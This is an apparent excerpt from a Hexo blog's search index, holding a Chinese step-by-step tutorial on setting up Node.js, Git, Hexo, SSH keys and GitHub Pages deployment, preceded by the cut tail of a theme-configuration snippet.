plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\# Beautify (美化頁面顯示)</span><br><span class="line"></span><br><span class="line">beautify:</span><br><span class="line"></span><br><span class="line"> enable: true</span><br><span class="line"></span><br><span class="line"> field: post # site/post</span><br><span class="line"></span><br><span class="line"> title-prefix-icon: # &#x27;\f0c1&#x27;</span><br><span class="line"></span><br><span class="line"> title-prefix-icon-color: # &#x27;#F47466&#x27;</span><br></pre></td></tr></table></figure><h3 id="主题魔改参考教程"><a href="#主题魔改参考教程" class="headerlink" title="主题魔改参考教程"></a>主题魔改参考教程</h3><p><a href="https://www.fomal.cc/">https://www.fomal.cc/</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo个人博客搭建</title>
      <link href="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h3><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h4><p>node.js官网：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></p><p>Hexo 是一款基于 node.js的静态博客框架,所以需要配置好node.js环境。</p><h4 id="2-环境配置步骤"><a href="#2-环境配置步骤" class="headerlink" title="2.环境配置步骤"></a>2.环境配置步骤</h4><p>首先去node.js官网下载稳定的预构建安装程序，之后新建文件夹将安装程序放入，启动过程中可以更改文件储存路径（虽然但是还是不建议放c盘）</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713115547618.png" class="" title="image-20240713115547618"><p>然后在电脑设置中搜索高级系统设置，点击环境变量。这时你会发现预安装程序已经将node.js的环境变量写入系统变量（环境变量）了。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120605794.png" class="" title="image-20240713120605794"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120307907.png" class="" title="image-20240713120307907"><style>.ssgvgkuqxqwb{zoom:80%;}</style><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120057786.png" class="ssgvgkuqxqwb" alt="image-20240713120057786"><p>之后点击win+R，输入cmd，打开终端输入node -v和npm -v查看版本，发现已经出现版本号。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120826444.png" class="" title="image-20240713120826444"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120909905.png" class="" title="image-20240713120909905"><p>之后在存储node.js的文件夹中新建两个文件夹【node_global】和【node_cache】</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121043654.png" class="" title="image-20240713121043654"><p>之后在用户变量的PATH里，将默认的 C:APPData\Roaming\npm 修改成 C:\Program Files\nodejs\node_global</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121507254.png" class="" title="image-20240713121507254"><p>完成后我们退出来，在系统变量处新建一个NODE_PATH,并写入</p><p>G:\xxx（自己保存node.js的文件夹位置）\node.js\node_global\node_modules</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120653380.png" class="" title="image-20240713120653380"><p>之后我们进入系统变量的PATH里新建一个变量%NODE_PATH%，还有另外两个变量%NODE_PATH%\node_cache和%NODE_PATH%\node_global</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121840722.png" class="" title="image-20240713121840722"><p>然后进行测试：npm install express -g   &#x2F;&#x2F; -g是全局安装的意思，尝试下载看是否报错。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121936785.png" class="" title="image-20240713121936785"><p>没有梯子就更换国内镜像源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h3><p>下载地址：<a href="https://git-scm.com/download">https://git-scm.com/download</a></p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122258697.png" class="" title="image-20240713122258697"><p>之后将下载的预安装包找一个文件夹放，之后除了安装路径，无脑下一步就行，想改文末有参考教程，很详细。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122552506.png" class="" title="image-20240713122552506"><p>git的使用：鼠标右键文件夹，如果没有git bash，如下图，就点击显示更多选项</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122855110.png" class="" title="image-20240713122855110"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713123006602.png" class="" title="image-20240713123006602"><h2 id="二、hexo下载"><a href="#二、hexo下载" class="headerlink" title="二、hexo下载"></a>二、hexo下载</h2><p>我们这里建议新建一个文件夹，放hexo，之后git bash打开位置放在hexo文件夹中，之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli#如果出现报错，尝试在命令前加上npx，下文hexo内容同理</span><br></pre></td></tr></table></figure><p>下载完成之后输入 hexo -v查看版本，有版本显示就说明下载完成。</p><p>之后进入hexo文件夹中，输入一下命令初始化文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init </span><br></pre></td></tr></table></figure><p>这样本地的网站配置也弄好啦，输入【hexo g】生成静态网页，然后输入【hexo s】打开本地服务器（ctrl+c关闭本地服务器），之后就可以在浏览器的url栏输入localhost:4000，本地博客就搭建完成了。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713123656676.png" class="" title="image-20240713123656676"><h2 id="三、github托管"><a href="#三、github托管" class="headerlink" title="三、github托管"></a>三、github托管</h2><p>注册一个github账号：<a href="https://github.com/">https://github.com/</a></p><p>新建一个仓库，your repositories，新建一个仓库。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124009896.png" class="" title="image-20240713124009896"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124104126.png" class="" title="image-20240713124104126"><p>填写内容如下，选一个喜欢的名字但是后缀不能改变。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124421405.png" class="" title="image-20240713124421405"><h4 id="ssh私钥连接"><a href="#ssh私钥连接" class="headerlink" title="ssh私钥连接"></a>ssh私钥连接</h4><p>在git bash输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#第一次使用git后需要将用户名和邮箱进行初始化</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;yourname&quot; </span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>用以下命令检查是否输对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line"></span><br><span class="line"> git config user.email</span><br></pre></td></tr></table></figure><p>然后一直回车（enter），之后输入以下命令进行邮箱验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>之后电脑c盘&#x2F;用户&#x2F;电脑用户名，文件夹中会出现一个.ssh文件夹，如下图，右键记事本打开其中的id_rsa.pub，复制所有内容。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125128617.png" class="" title="image-20240713125128617"><p>之后来到github，点击头像，点击setting，在ssh和gpg key里点击NEW ssh key，之后输入复制的内容（名字随便起）</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125250712.png" class="" title="image-20240713125250712"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125342974.png" class="" title="image-20240713125342974"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125430180.png" class="" title="image-20240713125430180"><p>之后在git bash里输入ssh -T <a href="mailto:&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;">&#103;&#105;&#x74;&#x40;&#103;&#105;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#x6d;</a>，如果出现下图（你的用户名），就说明成功</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125606931.png" class="" title="image-20240713125606931"><p>之后我们就可以配置hexo文件夹中的_confing.yml配置文件了，repository修改为你自己的github项目地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: https://hackingtree.github.io/Blog.github.io/</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br></pre></td></tr></table></figure><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240714214124767.png" class="" title="image-20240714214124767"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">  type: git  </span><br><span class="line">  repository: https://github.com/xxx（用户名）/xxx.github.io.git （见下图）</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713130104371.png" class="" title="image-20240713130104371"><p>或者</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713130128677.png" class="" title="image-20240713130128677"><p>之后输入以下命令，下载插件，将生成网页通过git方式上传到你对应的链接仓库中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line"></span><br><span class="line">hexo g （generate） </span><br><span class="line"></span><br><span class="line">hexo d （deploy）</span><br></pre></td></tr></table></figure><p>将配置文件上传到git仓库中，这三个命令一般都是一起使用的</p><p>第一次hexo d的时候可能会有密码（你的github密码）</p><p>之后访问<a href="https://github.com/xxx%EF%BC%88%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%89/xxx.github.io.git%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BA%86%E3%80%82">https://github.com/xxx（用户名）/xxx.github.io.git就可以访问你的博客了。</a></p><h2 id="四、next主题配置"><a href="#四、next主题配置" class="headerlink" title="四、next主题配置"></a>四、next主题配置</h2><p>参考链接<a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客</a></p><p>参考链接<a href="https://iitii.github.io/2021/05/28/1/#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84">Hexo Next 主题安装、配置及美化 | Hello Memo (iitii.github.io)</a></p><p>文章参考和部分图片来源：</p><p>node.js下载和环境配置：<a href="http://t.csdnimg.cn/GpuGX">http://t.csdnimg.cn/GpuGX</a></p><p>git下载和环境配置：<a href="http://t.csdnimg.cn/cuSYy">http://t.csdnimg.cn/cuSYy</a></p><p>hexo+git个人博客搭建：<a href="http://t.csdnimg.cn/7UFPd">http://t.csdnimg.cn/7UFPd</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
